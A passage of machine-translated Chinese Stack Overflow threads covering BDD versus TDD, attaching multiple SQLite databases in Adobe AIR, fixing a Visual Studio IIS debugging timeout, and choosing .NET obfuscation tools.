您将在此[视频](http://video.google.com/videoplay?docid=8135690990081075324)中找到 BDD 和 TDD 的比较。[Jeremy D. Miller](http://codebetter.com/blogs/jeremy.miller/archive/2007/09/06/bdd-tdd-and-the-other-double-d-s.aspx)还认为 BDD 是“正确的 TDD”

**2013 年 3 月 25 日更新**

上面的视频已经丢失了一段时间。这是 Llewellyn Falco 最近的一篇，[BDD 与 TDD（已解释）](https://www.youtube.com/watch?v=mT8QDNNhExg)。我觉得他的解释清楚而中肯。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2008-09-08T18:36:06.613

对我来说，BDD 和 TDD 之间的主要区别在于焦点和措辞。言语对于传达您的意图很重要。

TDD 将重点放在测试上。而且由于在“旧瀑布世界”中测试是在实施之后进行的，因此这种心态会导致错误的理解和行为。

BDD 将注意力集中在行为和规范上，因此瀑布式思维被分散了注意力。所以 BDD 更容易理解为设计实践而不是测试实践。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2008-09-10T16:00:43.147

似乎有两种类型的 BDD。

第一个是 Dan North 讨论的原始样式，它导致了 xBehave 样式框架的创建。对我来说，这种风格主要适用于针对域对象的验收测试或规范。

第二种风格是 Dave Astels 所推广的，对我来说，它是一种新形式的 TDD，它有一些重要的好处。它专注于行为而不是测试以及小型测试类，试图达到每个规范（测试）方法基本上只有一行的地步。这种风格适合所有级别的测试，并且可以使用任何现有的单元测试框架来完成，尽管较新的框架（xSpec 风格）有助于将注意力集中在行为而不是测试上。

还有一个 BDD 组，您可能会发现它很有用：

[http://groups.google.com/group/behaviordrivendevelopment/](http://groups.google.com/group/behaviordrivendevelopment/)

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2017-02-12T16:43:55.153

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-08-27T20:59:59.253

我对 BDD 方法进行了一些试验，我过早的结论是 BDD 非常适合用例实现，但不适用于底层细节。TDD 仍然在那个水平上摇摆不定。

BDD 也用作通信工具。目标是编写领域专家可以理解的可执行规范。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-08-05T16:06:36.880

行为驱动开发似乎更关注开发人员之间以及开发人员和测试人员之间的交互和沟通。

维基百科文章有一个解释：

[行为驱动开发](http://en.wikipedia.org/wiki/Behavior_Driven_Development)

虽然我自己没有练习 BDD。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-08-05T16:11:02.783

在我看来，BDD 的范围更广。这几乎意味着使用了 TDD，即 BDD 是一种包容性方法，它收集信息和要求以使用 TDD 实践以确保快速反馈。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-05-25T04:09:09.907

根据我在 BDD 方面的最新知识，与 TDD 相比，BDD 侧重于指定接下来会发生什么，而 TDD 侧重于设置一组条件，然后查看输出。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2015-05-28T22:36:21.530

考虑 TDD 的主要好处是设计。它应该被称为测试驱动设计。BDD 是 TDD 的一个子集，称为行为驱动设计。

现在考虑一个流行的 TDD 实现——单元测试。单元测试中的单元通常是一点逻辑，是您可以制作的最小工作单元。

当您以一种功能性的方式将这些单元组合在一起以向机器描述所需的行为时，您需要了解您向机器描述的行为。行为驱动设计侧重于验证实施者对用例/需求/任何内容的理解，并验证每个功能的实现。BDD 和 TDD 通常的重要目的是为设计提供信息，第二个目的是验证实现的正确性，尤其是当它发生变化时。正确完成 BDD 涉及 biz 和 dev（和 qa），而单元测试（可能被错误地视为 TDD 而不是一种 TDD）通常在 dev 孤岛中完成。

我要补充一点，BDD 测试是生活要求。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2014-10-07T08:52:06.113

TDD和BDD之间没有区别。除非您可以更好地阅读测试，并且可以将它们用作要求。如果您使用与编写 BDD 测试相同的词来编写您的需求，那么您可以从您的客户那里获得一些已定义的测试以准备编写代码。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2016-01-18T03:01:02.753

这是快速快照：

> *   TDD 只是在编写代码之前测试代码的过程！
>     
>     
> *   DDD 是在每次接触代码之前被告知域的过程！
>     
>     
> *   BDD 是 TDD 的实现，它带来了 DDD 的某些方面！

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2019-08-24T14:53:09.023

简而言之，TDD和BDD之间有很大的区别在TDD中，我们主要关注测试数据在BDD中，我们主要关注项目的行为，以便任何非编程人员都可以理解代表标题的代码行那个方法

# actionscript-3 - 一次使用多个 SQLite 数据库

> ID：2518
> 
> 赞同：9
> 
> 时间：2008-08-05T16:09:12.570
> 
> 标签：actionscript-3, apache-flex, sqlite, air, adobe

我有 2 个 SQLite 数据库，一个从服务器下载 ( `server.db`)，一个用作客户端的存储 ( `client.db`)。我需要使用服务器数据库中的数据对客户端数据库执行各种同步查询。

例如，我想删除表中的所有行`client.db tRole`，并重新填充表中的所有行`server.db tRole`。

另一个例子，我想删除`client.db tFile`表中`fileID`不在表中的所有行`server.db tFile`。

在 SQL Server 中，您只需在表前加上数据库名称即可。无论如何使用 Adob​​e Air 在 SQLite 中执行此操作？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-08-13T16:16:12.450

我刚刚查看了 AIR SQL API，上面有一个`attach`方法`SQLConnection`看起来正是您需要的。

我没有对此进行测试，但根据文档它应该可以工作：

```
var connection : SQLConnection = new SQLConnection();

connection.open(firstDbFile);
connection.attach(secondDbFile, "otherDb");

var statement : SQLStatement = new SQLStatement();

statement.connection = connection;
statement.text = "INSERT INTO main.myTable SELECT * FROM otherDb.myTable";
statement.execute(); 
```

该代码片段中可能存在错误，我最近没有太多使用 AIR SQL API。请注意，使用 打开的数据库的表`open`可以使用`main.tableName`，任何附加的数据库都可以被赋予任何名称（`otherDb`在上面的示例中）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-08-12T12:55:01.623

在 SQLite 中一次打开多个数据库是可能的，但在使用 Flex/AIR 时是否可以完成是值得怀疑的。在您运行的命令行客户端中，您可以像在 MySQL 或 SQL Server 中一样`ATTACH DATABASE path/to/other.db AS otherDb`引用该数据库中的表。`otherDb.tableName`

> 可以使用语法 database-name.table-name 来引用附加数据库中的表。
> 
> [在 sqlite.org 上附加数据库文档](http://www.sqlite.org/lang_attach.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T16:46:43.463

这段代码可以工作，它是我写的：

```
package lib.tools

import flash.utils.ByteArray;
import flash.data.SQLConnection;
import flash.data.SQLStatement;
import flash.data.SQLResult;
import flash.data.SQLMode; 
import flash.events.SQLErrorEvent;
import flash.events.SQLEvent;
import flash.filesystem.File;
import mx.core.UIComponent;
import flash.data.SQLConnection;

public class getConn {
    public var Conn:SQLConnection;

    public function getConn(database:Array) {       
        Conn = new SQLConnection();
        var Key:ByteArray = new ByteArray();
        Key.writeUTFBytes("Some16ByteString"); 
        Conn.addEventListener(SQLErrorEvent.ERROR, createError);
        var dbFile:File = File.applicationDirectory.resolvePath(database[0]);
        Conn.open(dbFile);
        if(database.length > 1) {
            for(var i:Number = 1; i < database.length; i++) {
                var DBname:String = database[i];
                Conn.attach(DBname.split("\.")[0], File.applicationDirectory.resolvePath(DBname));
            }
        }
        Conn.open(dbFile, SQLMode.CREATE, false, 1024, Key); 
    }

    private function createError(event:SQLErrorEvent):void {
        trace("Error code:", event.error.details);
        trace("Details:", event.error.message);
    }

    public function Rs(sql:Array):Object {
        var stmt:SQLStatement = new SQLStatement();
        Conn.begin();
        stmt.sqlConnection = Conn;
        try {
            for(var i:String in sql) {          
                stmt.text = sql[i]; 
                stmt.execute();
            }
            Conn.commit();
        } catch(error:SQLErrorEvent) {
            createError(error);
            Conn.rollback();
        };
        var result:Object =stmt.getResult();
        return result;
    }
} 
```

# asp.net - Visual Studio “无法在 Web 服务器上开始调试。Web 服务器没有及时响应。”

> ID：2524
> 
> 赞同：53
> 
> 时间：2008-08-05T16:18:18.853
> 
> 标签：asp.net, visual-studio, visual-studio-2008, debugging, iis

在 Visual Studio 中编译并运行我的 Web 应用程序时，我经常收到以下错误：

“无法在Web服务器上开始调试。Web服务器没有及时响应。这可能是因为另一个调试器已经附加到Web服务器上。”

通常这是在已经调试过一次应用程序之后。从命令行我运行“iisreset /restart”，它解决了这个问题。

我如何首先防止这种情况发生？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2015-01-15T21:57:53.533

对我有用的解决方案：

1.  打开命令提示符（以管理员身份运行）

2.  写`iisreset /restart`

3.  现在，回到您的 VS 并进行调试。它将调试您的解决方案。

就我而言，它也适用于 Visual Studio 2013 和 2015。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2008-09-30T06:04:38.680

我发现如果我使用 Firefox 作为我的浏览器进行调试，就会发生这种情况。当我退出 Firefox 时，VS2005/8 调试会话不会终止。我还没有找到解决方案（还）。

如果您遇到这种情况，那么比运行 iisreset 更快的解决方案是在 Visual Studio 中按 Shift-F5，这将终止当前的调试会话。然后您可以按 F5，这将启动一个新的调试会话。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-02-24T05:00:32.450

在这里和其他地方尝试了所有建议的解决方案（至少 10 种不同的方法）之后，对我有用的唯一选择是：

*   删除 IIS 上的网站和应用程序池
*   在 IIS 上重新创建网站和应用程序池（在我的情况下，一切都与以前完全相同）

PS：我使用的是 VS 2013 和 IIS 7.5 (Win7)。

我希望这可以节省其他人几个小时。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2011-01-28T12:21:01.560

在运行应用程序之前转到任务管理器并结束进程 aspnet_wp.exe

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2015-03-26T13:45:59.813

我有几次这个问题。有一次，它通过接受 Guy 的建议得到了解决：

> 如果您遇到这种情况，那么比运行 iisreset 更快的解决方案是在 Visual Studio 中按 Shift-F5，这将终止当前的调试会话。然后您可以按 F5，这将启动一个新的调试会话。

在另一个场合，我不得不：在 Windows 任务管理器 (w3wp.exe*) 中终止我的所有 IIS 工作进程。您应该能够在 Visual Studio 中按 f5 进行调试。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-08-05T16:35:17.087

当您收到此错误时，听起来您可能正在 Visual Studio 中按 F5？

您可以尝试几件事。最简单的方法是在按 F5 之前按**停止按钮。**或者，当您完成调试并开始进行更改时，您可以转到**Debug**菜单并选择**Stop Debugging**或**Terminate All**。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-08-20T14:06:22.940

我们使用另一种调试方式，我们不再使用 F5。

我们使用类似的宏：http: [//blogs.conchango.com/howardvanrooijen/archive/2007/06/24/Attach-to-Web-Server-Macro-for-Visual-Studio.aspx](http://blogs.conchango.com/howardvanrooijen/archive/2007/06/24/Attach-to-Web-Server-Macro-for-Visual-Studio.aspx)（我们绑定到F6)。

这样，您只需将调试器附加到 IIS。它（取决于项目大小）更快地进行更改，编译您更改的单个项目并再次附加调试器。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2016-10-13T13:00:07.110

调试 2 个 Web 应用程序（1 个 MVC 和 2 个是 MVC WebAPI）时，它们都托管在本地 IIS 中。确保每个应用程序使用不同的应用程序池。我遇到了同样的问题，一旦我更改了另一个应用程序池，它就起作用了！

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-08-25T05:03:03.357

我有生以来第一次看到这条消息，我对正在发生的事情感到非常困惑，因为不清楚该怎么做。

我运行了**iisreset**，只用了 1 秒就完成了执行，然后砰，我又回到了游戏中。

PS我正在使用铬

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2013-10-07T10:05:28.560

在 Visual Studio 中按 Shift+F5，这将终止当前调试会话。然后您可以按 F5，这将启动一个新的调试会话。

或者

关闭您的应用程序，重置 iis，然后打开您的应用程序并运行它

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2013-12-13T14:58:17.377

对我来说，我开了两个视觉工作室。调试器已经附加到另一个视觉工作室:)。我在第一个上停止了它，并能够附加到第二个视觉工作室。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2015-04-01T15:13:58.640

非常基本 - 但如果您尝试通过单击“浏览”从 IIS 运行网站，请检查该网站是否实际运行。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-08-05T16:35:50.517

听起来有些东西正在消耗您的 Web 服务器的资源。也许您有一些正在打开和未关闭的资源（文件处理程序、wcf 代理）？当我没有关闭 WCF 客户端代理连接时，我特别遇到过这种情况。

问题不一定是您连接了调试器，而只是 Web 服务器没有及时响应。请注意，消息显示“这**可能**是因为附加了另一个调试器”。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-05-13T07:37:17.920

如果你有很多断点，这会减慢调试过程，所以删除不需要的断点并关闭 Autos 窗口，这将解决你的问题

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-08-07T11:05:55.640

当 iexplore 的另一个实例仍在运行时，通常会出现此问题。当我的 IE 崩溃时，我曾经遇到过这个问题，但我仍然可以在任务管理器中看到它。一旦你“结束进程”，一切都会恢复正常:)

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2010-06-17T20:55:49.057

只有当您通过 IIS 运行解决方案时，此答案才适用。如果您通过执行以下操作打开您的网站/项目，您将知道这是否适用于您：从 Visual Studio 中-->打开网站-->本地 IIS -->选择您的项目

这个错误踢了我 4 个小时，但最终我找到了答案。我首先尝试了 iisreset /restart。这似乎有点帮助，但仍然收到相同的错误。

对我有用的是（xp机器）添加/删除程序->添加/删除Windows组件->单击IIS->单击“详细信息”。如果您通过 IIS 进行调试，请务必安装 Front Page Extensions。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2011-09-09T11:30:39.900

如果所有答案都不适合您，只需在任务管理器中结束处理所有 IIS 相关组件即可。这对我有用。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2012-10-04T14:59:33.550

我在尝试在 VS.NET 中调试 (2) 单独的解决方案时遇到了这个问题，并且*两者*都使用 IIS Web 服务器来启动应用程序。第一个应用程序将启动，但随后启动的任何也通过 IIS 运行的应用程序都将显示该错误。似乎它一次只能通过托管在 IIS 中的 VS.NET 调试单个应用程序。

解决方案：从 VS.NET 运行项目 1（放置任何需要的断点）并直接从 IIS（不是 VS.NET）启动*第二个应用程序。*访问 App 2（直接从 IIS 运行）时，将命中 App 1（在 VS.NET 中运行）中的断点。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2013-01-10T17:24:52.183

这在 VS 2010 express 中经常发生在我身上——通常是因为调试器停止响应。右击windows任务栏，选择“启动任务管理器”。ASP.NET 调试器很可能会显示“无响应”状态。选择它并简单地终止该过程。

完毕！

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2013-03-18T01:01:24.147

对我来说，当 IE 升级到较新版本时发生这种情况，转到已安装的更新，删除新版本的 IE，计算机重新启动后它又回到旧版本并解决了调试问题

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2015-08-28T13:58:25.510

有同样的问题，即使在重新启动后。基本上是这样做的：

1.  重新启动 IIS
2.  清洁解决方案
3.  重建解决方案

然后它又开始工作了。

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2015-12-16T11:28:08.183

如果您的网站使用数据库连接但数据库服务器不可用，也可能会导致这种情况。

我花了一些时间尝试以通常的方式解决此问题，但即使在重新启动我的工作站后，问题仍然存在。最终我发现 SQL Server (MSSQLSERVER) 服务没有运行。

它应该一直在运行，因为它被设置为自动，但它被停止了，即使在重新启动之后也是如此。事件日志中的所有 MSSQLSERVER 事件看起来都很正常，所以它为什么没有运行仍然未知，但我现在将其设置为自动（延迟启动），希望这将减少启动期间的资源争用。

启动 MSSQLSERVER 后，该消息`"Unable to start debugging on the web server. The web server did not respond in a timely manner"`不再出现，并且恢复了正常服务。

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2016-07-15T09:26:00.390

安装 vs2015 update3 后，我不得不重新创建站点/应用程序/虚拟目录以使其工作。希望这可以帮助某人。;)

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2016-08-31T17:30:05.390

我知道这是一个老问题，但我最近遇到了同样的情况并尝试了这篇文章中的每一个解决方案，但没有运气。最后，我找到了适合我的解决方案：

1.  关闭 Visual Studio
2.  在**控制面板**中找到**打开或关闭 Windows 功能**
***   在弹出对话框中取消选中**Internet 信息服务***   重启你的电脑*   在同一个对话框中检查**Internet 信息服务**，并确保**Internet 信息服务**->**万维网服务**->**应用程序开发功能**-> **ASP.NET**也被选中*   打开 Visual Studio，现在您的应用程序应该能够在调试模式下运行**

 *** * *

## 回答 #25

> 赞同：0
> 
> 时间：2016-09-05T11:41:16.620

打开

*   调试下的选项和设置
*   符号和未选中的 Microsoft 符号服务器
*   构建解决方案
*   iis重置
*   F5 解决方案（确保再次取消选中 Microsoft Symbol Servers）

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2017-04-05T19:02:04.240

@mtkachenko [Visual Studio 2012 对我有用：无法附加进程。调试器已附加](https://stackoverflow.com/questions/24605673/visual-studio-2012-unable-to-attach-the-process-a-debugger-is-already-attached) “我已经安装了调试诊断工具 v2.0，因此我有调试诊断服务，它会自动启动并附加到 w3wp 进程之一。关闭并禁用此服务后一切正常。所以如果你在任务管理器中获取这样的错误检查进程，它可以捕获你的 w3wp 进程”

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2021-04-16T08:33:44.863

我通过在 IIS 服务器中创建一个新的 ApplicationPool 并将我的应用程序指向新的 ApplicationPool 来实现它。我还删除了旧的 ApplicationPool

* * *

## 回答 #28

> 赞同：-1
> 
> 时间：2013-03-25T14:39:57.920

我刚刚在我的机器上解决了这个问题。我的问题是我将 IE 9 升级到 IE 10 并出现此错误。解决方法：删除IE 10并降级到IE 9。转到“程序和功能”-->“查看最近的更新”-->找到IE 10--->卸载它-->重启--->ie 9又回来了--->调试--->工作正常。

* * *

## 回答 #29

> 赞同：-1
> 
> 时间：2014-07-09T07:22:42.363

尝试执行以下任一步骤来解决您的问题：

*   重新启动 IIS 服务器
*   清理项目的解决方案，然后再次构建

如果上述步骤没有帮助，您最终可以尝试重新启动机器

* * *

## 回答 #30

> 赞同：-1
> 
> 时间：2016-02-06T07:09:43.950

在您的 cmd 中键入 iisreset 并在您的 iis 被重置并且您的应用程序运行正常之后按 enter

* * *

## 回答 #31

> 赞同：-2
> 
> 时间：2019-06-11T10:09:30.997

就我而言，它可以解决删除所有断点的问题。看起来我有很多断点（有条件的和无条件的），这导致资源不足。**

# .net - .NET 混淆工具/策略

> ID：2525
> 
> 赞同：165
> 
> 时间：2008-08-05T16:20:37.773
> 
> 标签：.net, security, obfuscation

我的产品有几个组件：ASP.NET、Windows Forms App 和 Windows Service。95% 左右的代码是用 VB.NET 编写的。

出于知识产权的原因，我需要对代码进行模糊处理，直到现在我一直在使用一个 dotfuscator 版本，它现在已经超过 5 年了。我认为是时候转向新一代工具了。我正在寻找的是在搜索新的混淆器时应该考虑的要求列表。

到目前为止，我知道我应该寻找什么：

*   ***序列化/反序列化***。在我当前的解决方案中，我只是告诉该工具**不要**混淆任何类数据成员，因为无法加载之前序列化的数据的痛苦太大了。
*   ***与构建过程集成***
*   ***使用 ASP.NET***。过去，由于更改 .dll 名称（通常每页有一个），我发现这个问题 - 并非所有工具都能很好地处理。

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2008-08-07T18:15:46.197

我们已经尝试了许多混淆器。它们都不适用于使用远程处理的大型客户端/服务器应用程序。问题是客户端和服务器共享一些 dll，我们还没有找到任何可以处理它的混淆器。

我们已经尝试过 DotFuscator Pro、SmartAssembly、XenoCode、Salamander 和几个小型应用程序，它们的名字让我无法理解。

**坦率地说，我确信混淆是一个大技巧。**

即使它解决的问题也不完全是一个真正的问题。你真正需要保护的唯一东西是连接字符串、激活码、诸如此类的安全敏感的东西。另一家公司将对您的整个代码库进行逆向工程并从中创建竞争产品的胡说八道是偏执型经理的噩梦，而不是现实。

* * *

## 回答 #2

> 赞同：46
> 
> 时间：2009-05-11T06:04:41.227

我现在对此很“膝盖”，试图找到一个好的解决方案。以下是我目前的印象。

**Xenocode** - 我有一个 Xenocode2005 的旧许可证，我曾经用它来混淆我的 .net 2.0 程序集。它在 XP 上运行良好，是一个不错的解决方案。我当前的项目是 .net 3.5，我在 Vista 上，支持人员告诉我试一试，但 2005 版本甚至无法在 Vista 上运行（崩溃）所以我现在必须以惊人的价格购买“PostBuild2008” 1900 美元。这可能是一个很好的工具，但我不会去发现。太贵了。

**Reactor.Net** - 这是一个更具吸引力的价格点，它在我的独立可执行文件上运行良好。许可模块也很不错，可以为我节省很多精力。不幸的是，它缺少一个关键功能，那就是从混淆中排除内容的能力。这使得无法达到我需要的结果（将多个程序集合并在一起，混淆一些，不混淆其他）。

**SmartAssembly** - 我为此下载了 Eval，它运行良好。我能够实现我想要的一切，并且界面是一流的。价格点还是有点高。

**Dotfuscator Pro** - 在网站上找不到价格。目前正在讨论中获取报价。听起来不祥。

**Confuser** - 一个运行良好的开源项目（顾名思义，混淆 ppl）。

注意：据报道，ConfuserEx在其 GitHub存储库中根据[Issue #498被“破坏”。](https://github.com/yck1509/ConfuserEx/issues/498)

* * *

## 回答 #3

> 赞同：45
> 
> 时间：2008-08-12T12:19:13.800

回到 .Net 1.1，混淆是必不可少的：反编译代码很容易，您可以从汇编代码到 IL 代码，再到 C# 代码，然后用很少的努力再次编译它。

现在有了.Net 3.5，我完全不确定。尝试反编译 3.5 程序集；你得到的距离编译还有很长的路要走。

添加从 3.5 开始的优化（比 1.1 好得多）以及匿名类型、委托等通过反射处理的方式（它们是重新编译的噩梦）。添加 lambda 表达式、编译器“魔术”如 Linq-syntax 和`var`以及 C#2 函数`yield`（这会导致新类的名称不可读）。您的反编译代码距离可编译还有很长的路要走。

一个有大量时间的专业团队仍然可以对其进行逆向工程，但任何混淆代码也是如此。他们从中得到的代码将是不可维护的，并且很可能是非常错误的。

我建议对您的程序集进行密钥签名（这意味着如果黑客可以重新编译一个他们必须重新编译所有程序），但我不认为混淆是值得的。

* * *

## 回答 #4

> 赞同：23
> 
> 时间：2008-08-05T16:30:40.170

如果您正在寻找免费的，您可以尝试使用 Visual Studio 或[Eazfuscator.NET](http://www.gapotchenko.com/eazfuscator.net)附带的 DotObfuscator 社区版。

* * *

[自 2012 年 6 月 29 日起](http://blog.gapotchenko.com/eazfuscator.net/code-virtualization)，Eazfuscator.NET 现已商业化。最后一个免费可用版本是 3.3。

* * *

## 回答 #5

> 赞同：18
> 
> 时间：2008-08-05T16:21:56.223

我一直在使用智能组装。基本上，您选择一个 dll，它会返回混淆的内容。它似乎工作正常，到目前为止我没有遇到任何问题。非常非常好用。

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2008-08-07T10:44:33.580

我已经尝试了市场上几乎所有的混淆器，SmartAssembly 在我看来是最好的。

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2008-08-22T17:41:21.020

我也一直在使用 SmartAssembly。我发现 Ezrinz .Net Reactor 在 .net 应用程序上对我来说要好得多。它混淆、支持 Mono、合并程序集，它还有一个非常好的许可模块来创建试用版或将许可链接到特定机器（非常容易实现）。价格也非常有竞争力，当我需要支持时，他们会很快得到支持。 [埃济里兹](http://www.eziriz.com/)

需要说明的是，我只是喜欢该产品的客户，与公司没有任何关系。

* * *

## 回答 #8

> 赞同：7
> 
> 时间：2009-07-16T21:45:02.367

简短的回答是你不能。

周围有各种工具会使某人更难阅读您的代码 - 其中一些已被其他答案指出。

然而，所有这些只会让阅读变得更难——它们增加了所需的工作量，仅此而已。通常这足以阻止普通读者，但决心深入研究您的代码的人总是能够这样做。

* * *

## 回答 #9

> 赞同：6
> 
> 时间：2008-11-16T19:57:28.593

我们有一个带有 asp.net 和 winform 界面的多层应用程序，它也支持远程处理。除了生成加载程序的加密类型之外，我使用任何混淆器都没有问题，这可能会以各种意想不到的方式出现问题，而且在我看来不值得。实际上，我的建议更像是“避免像瘟疫一样加密加载程序类型的混淆器”。:)

根据我的经验，任何混淆器都可以很好地处理 .net 的任何方面，包括 asp.net 和远程处理，您只需要熟悉设置并了解您可以在代码的哪些区域推动它。并花时间尝试对你得到的东西进行逆向工程，看看它是如何与各种设置一起工作的。

多年来，我们在我们的商业应用程序中使用了几个，并选择了来自 9rays.net 的 Spices 混淆器，因为价格合适，它可以完成工作并且他们有很好的支持，虽然我们真的多年来不再需要支持，但老实说我认为你使用哪个混淆器并不重要，如果你想让它与远程处理和 asp.net 一起正常工作，问题和学习曲线都是一样的。

正如其他人所提到的，您实际上所做的一切都相当于挂锁，将其他诚实的人拒之门外，或者使简单地重新编译应用程序变得更加困难。

许可通常是大多数人的关键领域，无论如何您绝对应该使用某种数字签名证书系统进行许可。如果您没有适当的智能系统，您最大的损失将来自随意共享许可证，破坏许可证系统的人一开始就不会购买。

真的很容易走得太远，对您的客户和您的业务产生负面影响，做简单合理的事情，然后不要担心。

* * *

## 回答 #10

> 赞同：6
> 
> 时间：2009-10-09T09:42:26.303

[Crypto Obfuscator](http://www.ssware.com/cryptoobfuscator/obfuscator-net.htm)解决您所有的问题和场景。它 ：

1.  根据规则自动从混淆中排除类型/成员。序列化类型/字段就是其中之一。
2.  它可以使用 MSBUild 集成到构建过程中。
3.  支持 ASP.Net 项目。

* * *

## 回答 #11

> 赞同：5
> 
> 时间：2009-02-04T22:40:14.280

在过去的两天里，我一直在试验 Dotfuscator Community Edition advanced（注册与 Visual Studio 捆绑在一起的基本 CE 后免费下载）。

我认为更多人不使用混淆作为默认选项的原因是与风险相比，这是一个严重的麻烦。在较小的测试项目中，我可以通过大量的努力让混淆代码运行。通过 ClickOnce 部署一个简单的项目很麻烦，但在使用 mage 手动签署清单后可以实现。唯一的问题是，错误时堆栈跟踪会被混淆，并且 CE 没有打包反混淆器或澄清器。

我试图混淆一个真正的项目，它是基于 Excel 的 VSTO，具有虚拟地球集成、大量的 web 服务调用和一个 IOC 容器以及大量的反射。这是不可能的。

如果混淆确实是一项关键要求，那么您应该从一开始就考虑到这一点来设计您的应用程序，并随着您的进展测试混淆的构建。否则，如果这是一个相当复杂的项目，你最终会遭受严重的痛苦。

* * *

## 回答 #12

> 赞同：4
> 
> 时间：2008-09-11T11:53:35.760

我最近尝试将一个免费混淆器的输出通过管道传输到另一个免费混淆器 - 即 Dotfuscator CE 和 CodePlex 上的新 Babel 混淆器。更多细节[在我的博客上](http://harriyott.com/2008/09/obfuscations-what-you-need-if-you-want.aspx)。

至于序列化，我已将该代码移动到不同的 DLL 中并将其包含在项目中。我推断其中没有任何秘密不在 XML 中，所以它不需要混淆。如果这些类中有任何严重的代码，在主程序集中使用部分类应该覆盖它。

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2008-09-10T21:38:59.277

您应该使用最便宜和最适合您的平台的任何东西，然后收工。高级语言的混淆是一个难题，因为 VM 操作码流不会受到原生操作码流存在的两个最大问题的困扰：函数/方法识别和寄存器别名。

关于字节码反转你应该知道的是，安全测试人员审查直接 X86 代码并发现其中的漏洞已经是标准做法。在原始 X86 中，您甚至不一定能找到有效的函数，更不用说在整个函数调用中跟踪局部变量了。几乎在任何情况下，本机代码逆向者都无法访问函数和变量名称——除非他们正在审查 Microsoft 代码，MSFT 对此很有帮助地向公众提供了这些信息。

“Dotfuscation”主要通过加扰函数和变量名来工作。这样做可能比发布带有调试级别信息的代码更好，因为反射器实际上放弃了您的源代码。但是，您在此之外所做的任何事情都可能导致收益递减。

* * *

## 回答 #14

> 赞同：3
> 
> 时间：2008-09-16T11:12:55.457

我对 Smartassembly 没有任何问题。

* * *

## 回答 #15

> 赞同：3
> 
> 时间：2009-07-16T21:47:44.360

您可以使用“Dotfuscator Community Edition”——它默认出现在 Visual Studio 2008 Professional 中。你可以阅读它：

[http://msdn.microsoft.com/en-us/library/ms227240%28VS.80%29.aspx](http://msdn.microsoft.com/en-us/library/ms227240%28VS.80%29.aspx)
[http://www.preemptive.com/dotfuscator.html](http://www.preemptive.com/dotfuscator.html)

产品的“专业”版本要花钱，但更好。

你真的需要混淆你的代码吗？通常反编译你的应用程序几乎没有错误，除非它用于安全目的。如果您担心人们“窃取”您的代码，请不要担心；绝大多数查看您的代码的人都是出于学习目的。无论如何，.NET 没有完全有效的混淆策略 - 有足够技能的人总是能够反编译/更改您的应用程序。

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2011-05-04T09:43:43.223

避免反应堆。它完全没用（是的，我为许可证付费）。Xenocode 是我遇到的最好的一个，并且也购买了许可证。支持非常好，但我并不需要它，因为它只是工作。我测试了我能找到的每一个混淆器，我的结论是 xenocode 无疑是最强大的并且做得最好（也可以将你的 .NET exe 发布到我在其他任何地方都没有看到的本机 exe。）。

reactor 和 xenocode 之间有两个主要区别。第一个是 Xenocode 确实有效。第二个是您的程序集的执行速度没有什么不同。使用反应堆时，速度要慢约 600 万倍。我也得到了反应堆是一个人操作的印象。

* * *

## 回答 #17

> 赞同：3
> 
> 时间：2013-09-03T15:26:53.543

我发现 Agile.Net 为您的 .Net 程序集提供了很好的保护，因为它不仅提供了混淆，还提供了加密。下载免费路线。
[http://secureteam.net/NET-Code-Protection.aspx](http://secureteam.net/NET-Code-Protection.aspx) [http://secureteam.net/downloads.aspx](http://secureteam.net/downloads.aspx)

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2008-08-21T20:31:40.433

自 .Net 1 以来，我一直在对同一应用程序中的代码进行混淆处理，从维护的角度来看，这是一个令人头疼的问题。正如你所提到的，序列化问题是可以避免的，但是很容易犯错误并混淆你不想混淆的东西。很容易破坏构建，或者更改混淆模式并且无法打开旧文件。此外，很难找出问题所在和位置。

我们的选择是 Xenocode，如果我今天再次做出选择，我宁愿不混淆代码，或者使用 Dotfuscator。

* * *

## 回答 #19

> 赞同：2
> 
> 时间：2009-07-16T21:38:16.373

[这是微软自己的文档。](http://msdn.microsoft.com/en-us/magazine/cc164058.aspx)希望对您有所帮助......，它是从 2003 年开始的，但它可能仍然是相关的。

